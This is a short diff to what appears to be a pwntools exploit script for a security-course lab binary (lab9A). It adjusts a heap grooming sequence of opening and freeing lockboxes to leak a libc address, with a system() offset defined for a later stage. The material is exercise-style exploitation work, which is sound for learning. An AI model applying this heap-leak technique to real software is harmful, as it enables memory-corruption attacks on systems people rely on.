@@ -5,7 +5,6 @@ BIN_PATH = "/levels/lab09/lab9A"
 SYSTEM_OFFSET = 0x16a2bf
 
 
-
 def open_lockbox(index, element):
     p.sendline('1')
     p.recvuntil('Which lockbox do you want?: ')
@@ -47,12 +46,11 @@ p = process(BIN_PATH)
 p.recvuntil('Enter choice: ')
 open_lockbox(0, 256)
 open_lockbox(1, 256)
-open_lockbox(2, 256)
 destroy_lockbox(1)
-destroy_lockbox(2)
 destroy_lockbox(0)
 
-add_item_to_lockbox(0, 128)
+open_lockbox(0, 128)
+
 libc_addr = int(get_item_from_lockbox(0, 0)) & 0xffffffff
 log.info("Stage #1 - Leaking libc address: 0x%x" % hex(libc_addr))
 
